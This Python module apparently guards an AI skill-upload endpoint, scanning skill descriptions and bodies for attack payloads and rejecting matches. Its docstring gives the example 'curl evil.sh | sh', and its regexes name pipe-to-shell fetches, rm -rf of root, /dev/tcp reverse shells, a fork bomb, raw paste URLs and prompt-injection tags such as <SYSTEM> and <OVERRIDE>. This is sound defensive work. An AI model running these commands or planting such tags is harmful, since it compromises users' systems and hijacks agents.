"""Silent server-side scan for obvious attack payloads in uploaded skill content.

Not a complete defense — prompt injection is unsolved in general (Willison 2025).
This just raises the cost of drive-by attacks: an adversary who types
`curl evil.sh | sh` into a skill body gets a 422 at upload time and has to
obfuscate, which itself is a signal.

Scans both the `description` and `body` fields of POST/PATCH /skills.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

# Each rule: (compiled_pattern, short_reason).
_RULES: list[tuple[re.Pattern[str], str]] = [
    # Classic drive-by: fetch-and-execute.
    (re.compile(r"\b(?:curl|wget|fetch)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:sh|bash|zsh|ksh)\b", re.IGNORECASE),
     "pipe-to-shell"),
    (re.compile(r"\beval\s*\$?\(\s*(?:curl|wget|fetch)\b", re.IGNORECASE),
     "eval-of-fetch"),

    # Destructive filesystem ops targeting root or HOME.
    (re.compile(r"\brm\s+-rf?\s+(?:--no-preserve-root\s+)?(?:/|~|\$HOME)(?:\s|$)"),
     "rm-rf-root"),

    # Bash TCP/UDP redirection — used for reverse shells (`>&`, `>>`, `>` variants).
    (re.compile(r">[>&]?\s*/dev/(?:tcp|udp)/"),
     "bash-network-redirect"),

    # Tool-poisoning / hidden-instruction tags (Invariant Labs 2025).
    (re.compile(r"<\s*(?:IMPORTANT|SYSTEM|ADMIN|INSTRUCTIONS?|OVERRIDE)\s*>", re.IGNORECASE),
     "hidden-instruction-tag"),

    # Unusually long base64 blobs (400+ chars) — hidden payload.
    (re.compile(r"[A-Za-z0-9+/]{400,}={0,2}"),
     "opaque-base64-blob"),

    # `:(){ :|:& };:` fork bomb and variants.
    (re.compile(r":\(\)\s*\{\s*:\|:&\s*\}\s*;\s*:"),
     "fork-bomb"),

    # Self-replicating "download and run" from a raw pastebin-style URL.
    (re.compile(r"https?://(?:pastebin\.com/raw|transfer\.sh)/", re.IGNORECASE),
     "suspicious-raw-url"),
]


@dataclass(frozen=True)
class ScanMatch:
    reason: str
    snippet: str


def scan(*parts: str) -> list[ScanMatch]:
    """Return every rule that matched, across all string parts supplied."""
    hits: list[ScanMatch] = []
    for text in parts:
        if not text:
            continue
        for pattern, reason in _RULES:
            m = pattern.search(text)
            if m:
                hits.append(ScanMatch(reason=reason, snippet=_clip(m.group(0))))
    # Dedup by reason — a single reason reported twice adds no signal.
    seen = set()
    deduped: list[ScanMatch] = []
    for h in hits:
        if h.reason in seen:
            continue
        seen.add(h.reason)
        deduped.append(h)
    return deduped


def _clip(s: str, n: int = 80) -> str:
    s = s.replace("\n", " ")
    return s if len(s) <= n else s[: n - 1] + "…"
